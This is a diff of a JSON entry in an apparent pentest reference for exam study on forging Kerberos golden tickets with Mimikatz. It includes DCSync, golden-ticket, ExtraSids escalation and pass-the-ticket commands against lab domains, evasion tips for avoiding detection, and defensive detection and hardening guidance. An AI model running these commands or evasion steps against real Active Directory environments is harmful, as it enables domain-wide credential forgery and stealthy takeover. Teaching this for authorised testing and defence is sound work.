@@ -2,7 +2,7 @@
   "id": "ad-golden-ticket-mimikatz",
   "name": "Mimikatz - Forge Golden Ticket",
   "command": "kerberos::golden /user:<user> /domain:<child_domain> /sid:<child_sid> /krbtgt:<krbtgt_hash> /sids:<parent_EA_sid> /ptt",
-  "description": "Forges a Kerberos Golden Ticket using the KRBTGT hash. With /sids (ExtraSids), adds a foreign domain's SID to the ticket for cross-domain trust abuse. /ptt injects directly into memory (pass-the-ticket). The foundational Windows-side golden ticket technique \u2014 enables persistent DA-equivalent access or child\u2192parent trust escalation.",
+  "description": "Forges a Kerberos Golden Ticket using the KRBTGT hash. With /sids (ExtraSids), adds a foreign domain's SID to the ticket for cross-domain trust abuse. /ptt injects directly into memory (pass-the-ticket). The foundational Windows-side golden ticket technique — enables persistent DA-equivalent access or child→parent trust escalation.",
   "platform": "windows",
   "type": "command",
   "opsec": "loud",
@@ -27,14 +27,14 @@
     "T1558.001"
   ],
   "exam": "exam-ok",
-  "notes": "=== WHAT MAKES A GOLDEN TICKET 'GOLDEN' ===\nA golden ticket is a forged TGT (Ticket Granting Ticket) signed with the KRBTGT\naccount's NT hash. The KDC doesn't check TGTs against a database \u2014 it trusts them\nif they decrypt correctly with KRBTGT. So: KRBTGT hash \u2192 forge any TGT \u2192 any identity.\n\n=== ARGUMENTS ===\n  /user:       \u2192 username to impersonate (doesn't need to exist!)\n  /domain:     \u2192 domain FQDN\n  /sid:        \u2192 domain SID (S-1-5-21-...)\n  /krbtgt:     \u2192 KRBTGT NT hash (from DCSync or secretsdump)\n  /sids:       \u2192 ExtraSids: parent EA SID for cross-domain abuse\n  /ptt         \u2192 inject ticket into current session (pass-the-ticket)\n  /ticket:filename.kirbi \u2192 save to file instead of injecting\n  /id:         \u2192 RID of user (default 500 = Administrator)\n  /groups:     \u2192 group RIDs to include (default includes DA = 512, etc.)\n\n=== BASIC GOLDEN TICKET (same domain) ===\n# Get KRBTGT hash first (DCSync):\n# lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\krbtgt\n\n# Forge golden ticket:\nkerberos::golden /user:Administrator /domain:INLANEFREIGHT.LOCAL \\\n  /sid:S-1-5-21-3842939050-3880317879-2865463114 \\\n  /krbtgt:16e26ba33e455a8c338142af8d89ffbc /ptt\n\n# Use it:\ndir \\\\ACADEMY-EA-DC01\\C$   \u2192 should work as DA\n\n=== EXTRASIDS GOLDEN TICKET (child\u2192parent) ===\nkerberos::golden /user:Administrator /domain:LOGISTICS.INLANEFREIGHT.LOCAL \\\n  /sid:S-1-5-21-[child-sid] /krbtgt:<child_krbtgt_hash> \\\n  /sids:S-1-5-21-[parent-sid]-519 /ptt\n\n# Then from the same Mimikatz/cmd session:\nlsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\krbtgt\n\n=== TICKET LIFETIME ===\nDefault forged lifetime: 10 years (doesn't expire normally).\nWindows won't enforce expiry on these because KRBTGT still valid.\nTo reset: change KRBTGT password TWICE (invalidates all outstanding tickets).\n\n=== DETECT + DEFEND ===\nEvent 4769 Kerberos Service Ticket Operations \u2014 anomalous RC4 encryption on AES-enabled DCs.\nMicrosoft Defender for Identity: detects golden ticket usage via encryption downgrades.\nMitigation: change KRBTGT password twice to invalidate all forged tickets. Also covered in: OSCP PEN-200 Chapter 23 (Lateral Movement in Active Directory).",
+  "notes": "=== WHAT MAKES A GOLDEN TICKET 'GOLDEN' ===\nA golden ticket is a forged TGT (Ticket Granting Ticket) signed with the KRBTGT\naccount's NT hash. The KDC doesn't check TGTs against a database — it trusts them\nif they decrypt correctly with KRBTGT. So: KRBTGT hash → forge any TGT → any identity.\n\n=== ARGUMENTS ===\n  /user:       → username to impersonate (doesn't need to exist!)\n  /domain:     → domain FQDN\n  /sid:        → domain SID (S-1-5-21-...)\n  /krbtgt:     → KRBTGT NT hash (from DCSync or secretsdump)\n  /sids:       → ExtraSids: parent EA SID for cross-domain abuse\n  /ptt         → inject ticket into current session (pass-the-ticket)\n  /ticket:filename.kirbi → save to file instead of injecting\n  /id:         → RID of user (default 500 = Administrator)\n  /groups:     → group RIDs to include (default includes DA = 512, etc.)\n\n=== BASIC GOLDEN TICKET (same domain) ===\n# Get KRBTGT hash first (DCSync):\n# lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\krbtgt\n\n# Forge golden ticket:\nkerberos::golden /user:Administrator /domain:INLANEFREIGHT.LOCAL \\\n  /sid:S-1-5-21-3842939050-3880317879-2865463114 \\\n  /krbtgt:16e26ba33e455a8c338142af8d89ffbc /ptt\n\n# Use it:\ndir \\\\ACADEMY-EA-DC01\\C$   → should work as DA\n\n=== EXTRASIDS GOLDEN TICKET (child→parent) ===\nkerberos::golden /user:Administrator /domain:LOGISTICS.INLANEFREIGHT.LOCAL \\\n  /sid:S-1-5-21-[child-sid] /krbtgt:<child_krbtgt_hash> \\\n  /sids:S-1-5-21-[parent-sid]-519 /ptt\n\n# Then from the same Mimikatz/cmd session:\nlsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\krbtgt\n\n=== TICKET LIFETIME ===\nDefault forged lifetime: 10 years (doesn't expire normally).\nWindows won't enforce expiry on these because KRBTGT still valid.\nTo reset: change KRBTGT password TWICE (invalidates all outstanding tickets).\n\n=== DETECT + DEFEND ===\nEvent 4769 Kerberos Service Ticket Operations — anomalous RC4 encryption on AES-enabled DCs.\nMicrosoft Defender for Identity: detects golden ticket usage via encryption downgrades.\nMitigation: change KRBTGT password twice to invalidate all forged tickets. Also covered in: OSCP PEN-200 Chapter 23 (Lateral Movement in Active Directory).",
   "examples": [
     {
       "label": "Basic same-domain golden ticket",
       "command": "kerberos::golden /user:Administrator /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-3842939050-3880317879-2865463114 /krbtgt:16e26ba33e455a8c338142af8d89ffbc /ptt"
     },
     {
-      "label": "ExtraSids child\u2192parent escalation",
+      "label": "ExtraSids child→parent escalation",
       "command": "kerberos::golden /user:Administrator /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt"
     },
     {
@@ -42,15 +42,15 @@
       "command": "kerberos::golden /user:Administrator /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-3842939050-3880317879-2865463114 /krbtgt:16e26ba33e455a8c338142af8d89ffbc /ticket:admin_gold.kirbi"
     },
     {
-      "label": "Ch23 \u2014 get krbtgt hash via lsadump::lsa /patch (requires DC SYSTEM or DA)",
+      "label": "Ch23 — get krbtgt hash via lsadump::lsa /patch (requires DC SYSTEM or DA)",
       "command": "lsadump::lsa /patch"
     },
     {
-      "label": "Ch23 \u2014 purge existing tickets before injecting golden ticket",
+      "label": "Ch23 — purge existing tickets before injecting golden ticket",
       "command": "kerberos::purge"
     },
     {
-      "label": "Ch23 \u2014 forge and inject golden ticket with krbtgt hash + domain SID /ptt",
+      "label": "Ch23 — forge and inject golden ticket with krbtgt hash + domain SID /ptt",
       "command": "kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt"
     }
   ],
@@ -80,22 +80,50 @@
     }
   ],
   "defense": {
-    "why_it_works": "The Kerberos KDC validates TGTs by decrypting them with the KRBTGT account's secret key. It does not maintain a database of issued TGTs to cross-check against \u2014 if the ticket decrypts correctly and the PAC signature is valid (signed with KRBTGT), the KDC accepts it. With the KRBTGT NT hash, any identity, group membership, and lifetime can be forged into a cryptographically valid ticket. ExtraSids (/sids) appends a foreign domain's SID (e.g. Enterprise Admins SID-519) into the PAC \u2014 the parent DC processes the referral and grants those privileges.",
+    "why_it_works": "The Kerberos KDC validates TGTs by decrypting them with the KRBTGT account's secret key. It does not maintain a database of issued TGTs to cross-check against — if the ticket decrypts correctly and the PAC signature is valid (signed with KRBTGT), the KDC accepts it. With the KRBTGT NT hash, any identity, group membership, and lifetime can be forged into a cryptographically valid ticket. ExtraSids (/sids) appends a foreign domain's SID (e.g. Enterprise Admins SID-519) into the PAC — the parent DC processes the referral and grants those privileges.",
     "prerequisites": "KRBTGT account's NT hash (from DCSync/secretsdump). Domain SID of the target domain. For ExtraSids: child domain KRBTGT hash + both child and parent domain SIDs + Enterprise Admins SID (parent-SID-519). Windows host with Mimikatz. /ptt injects into the current session; /ticket saves to .kirbi for later import.",
-    "impact": "Persistent privileged access as any domain identity with arbitrary group memberships for up to 10 years. Survives password resets of the impersonated account. ExtraSids variant provides full Enterprise Admin access in the parent/root forest from a child domain compromise \u2014 forest-wide takeover. The only effective remediation is resetting KRBTGT twice.",
-    "detection": "Windows Security Event 4769 (TGS Request) with encryption type 0x17 (RC4-HMAC) on a domain where AES is enforced \u2014 a key golden ticket indicator. Event 4624 with unusual ticket lifetime values. Microsoft Defender for Identity generates a dedicated Golden Ticket alert detecting anomalous ticket characteristics: account SID mismatches, abnormal ticket lifetimes, RC4 downgrade on AES-capable domain, TGS requests without a corresponding TGT issuance. Event 4768 anomalies when the forged ticket attempts PAC validation.",
+    "impact": "Persistent privileged access as any domain identity with arbitrary group memberships for up to 10 years. Survives password resets of the impersonated account. ExtraSids variant provides full Enterprise Admin access in the parent/root forest from a child domain compromise — forest-wide takeover. The only effective remediation is resetting KRBTGT twice.",
+    "detection": "Windows Security Event 4769 (TGS Request) with encryption type 0x17 (RC4-HMAC) on a domain where AES is enforced — a key golden ticket indicator. Event 4624 with unusual ticket lifetime values. Microsoft Defender for Identity generates a dedicated Golden Ticket alert detecting anomalous ticket characteristics: account SID mismatches, abnormal ticket lifetimes, RC4 downgrade on AES-capable domain, TGS requests without a corresponding TGT issuance. Event 4768 anomalies when the forged ticket attempts PAC validation.",
     "artifacts": "Kerberos tickets in memory (klist output); LSASS logon session for the forged identity; .kirbi ticket file if saved to disk; Event 4624/4672 on accessed systems showing the forged account; Event 4769 with anomalous encryption type on DCs.",
-    "prevention": "Reset the KRBTGT account password TWICE in succession \u2014 the first reset generates a new key and begins invalidating old tickets; the second ensures the previous key (kept for one replication cycle) is also expired. Enable MDI for real-time detection. Configure domain to enforce AES-only Kerberos (disables RC4 \u2014 forces attacker to use AES key from DCSync, which is harder to obtain and more detectable). PAC validation enforcement (KDC validates PAC signatures from services). Protected Users group for sensitive accounts. SID filtering between trusted domains to block ExtraSids.",
-    "evasion": "Set /id: and /groups: to realistic values rather than defaults. Use AES256 key (/aes256:) instead of NT hash \u2014 eliminates RC4 downgrade indicator on modern domains (requires AES key from DCSync). Set ticket lifetime matching the domain policy (8h TGT lifetime) via /endin and /renewmax rather than the default 10-year. Inject with /ptt to avoid creating a .kirbi file on disk.",
+    "prevention": "Reset the KRBTGT account password TWICE in succession — the first reset generates a new key and begins invalidating old tickets; the second ensures the previous key (kept for one replication cycle) is also expired. Enable MDI for real-time detection. Configure domain to enforce AES-only Kerberos (disables RC4 — forces attacker to use AES key from DCSync, which is harder to obtain and more detectable). PAC validation enforcement (KDC validates PAC signatures from services). Protected Users group for sensitive accounts. SID filtering between trusted domains to block ExtraSids.",
+    "evasion": "Set /id: and /groups: to realistic values rather than defaults. Use AES256 key (/aes256:) instead of NT hash — eliminates RC4 downgrade indicator on modern domains (requires AES key from DCSync). Set ticket lifetime matching the domain policy (8h TGT lifetime) via /endin and /renewmax rather than the default 10-year. Inject with /ptt to avoid creating a .kirbi file on disk.",
     "sources": [
       "HTB M13",
       "MITRE T1558.001"
     ],
-    "misconfiguration": "Domain trusts (especially bidirectional and forest trusts) extend authentication boundaries. SID filtering is often disabled on forest trusts to support legacy applications \u2014 but this allows an attacker with Domain Admin in a child domain to forge a golden ticket with ExtraSids claiming Domain Admin SID in the parent/trusted forest. Without SID filtering (SIDHistory filtering), domain boundaries offer no security isolation.",
+    "misconfiguration": "Domain trusts (especially bidirectional and forest trusts) extend authentication boundaries. SID filtering is often disabled on forest trusts to support legacy applications — but this allows an attacker with Domain Admin in a child domain to forge a golden ticket with ExtraSids claiming Domain Admin SID in the parent/trusted forest. Without SID filtering (SIDHistory filtering), domain boundaries offer no security isolation.",
     "vulnerable_config": "# Bidirectional forest trust without SID filtering:\nGet-ADTrust -Filter * | Select-Object Name, Direction, SIDFilteringQuarantined\n# SIDFilteringQuarantined: False  <-- SID filtering DISABLED\n# Direction: BiDirectional        <-- both domains trust each other\n\n# Child domain to parent: SID filtering is always disabled by default\n# Enterprise Admin SID (S-1-5-21-<root>-519) can be added to ExtraSids\n# Golden ticket with ExtraSids = cross-domain privilege escalation",
-    "secure_config": "# Enable SID filtering on external/forest trusts:\nnetdom trust <TrustingDomain> /domain:<TrustedDomain> /quarantine:yes\n# 'Quarantine' = SID filtering enabled \u2014 ExtraSids from other domain are stripped\n\n# For child-to-parent trusts (SID filtering can't be enabled without breaking functionality):\n# Use Selective Authentication instead of full trust\n# Only accounts explicitly granted 'Allowed to Authenticate' can use the trust\nnetdom trust <ParentDomain> /domain:<ChildDomain> /SelectiveAuth:yes\n\n# Restrict SIDHistory (prevents ExtraSids abuse):\n# Audit accounts with SIDHistory:\nGet-ADUser -Filter {SIDHistory -like '*'} -Properties SIDHistory\n\n# Monitor cross-forest authentication:\n# Event 4769 on parent DC with ticket from child domain user"
+    "secure_config": "# Enable SID filtering on external/forest trusts:\nnetdom trust <TrustingDomain> /domain:<TrustedDomain> /quarantine:yes\n# 'Quarantine' = SID filtering enabled — ExtraSids from other domain are stripped\n\n# For child-to-parent trusts (SID filtering can't be enabled without breaking functionality):\n# Use Selective Authentication instead of full trust\n# Only accounts explicitly granted 'Allowed to Authenticate' can use the trust\nnetdom trust <ParentDomain> /domain:<ChildDomain> /SelectiveAuth:yes\n\n# Restrict SIDHistory (prevents ExtraSids abuse):\n# Audit accounts with SIDHistory:\nGet-ADUser -Filter {SIDHistory -like '*'} -Properties SIDHistory\n\n# Monitor cross-forest authentication:\n# Event 4769 on parent DC with ticket from child domain user"
   },
   "tools": [
     "mimikatz"
+  ],
+  "variations": [
+    {
+      "label": "Inject directly (ptt)",
+      "command": "kerberos::golden /user:<user> /domain:<child_domain> /sid:<child_sid> /krbtgt:<child_krbtgt_hash> /sids:<parent_ea_sid> /ptt"
+    },
+    {
+      "label": "Save to file instead",
+      "command": "kerberos::golden /user:<user> /domain:<child_domain> /sid:<child_sid> /krbtgt:<child_krbtgt_hash> /sids:<parent_ea_sid> /ticket:golden.kirbi"
+    }
+  ],
+  "steps": [
+    {
+      "label": "DCSync the child krbtgt hash",
+      "command": "lsadump::dcsync /user:<child_domain>\\krbtgt"
+    },
+    {
+      "label": "Get child domain SID + parent Enterprise Admins SID",
+      "command": "Get-DomainSID ; Get-DomainGroup -Domain <parent> -Identity 'Enterprise Admins' | select distinguishedname,objectsid"
+    },
+    {
+      "label": "Forge golden ticket with /sids = EA (SID history)",
+      "command": "kerberos::golden /user:Administrator /domain:<child_domain> /sid:<child_sid> /krbtgt:<hash> /sids:<parent_ea_sid> /ptt"
+    },
+    {
+      "label": "Access the parent DC",
+      "command": "dir \\\\<parent_dc>\\C$"
+    }
   ]
 }
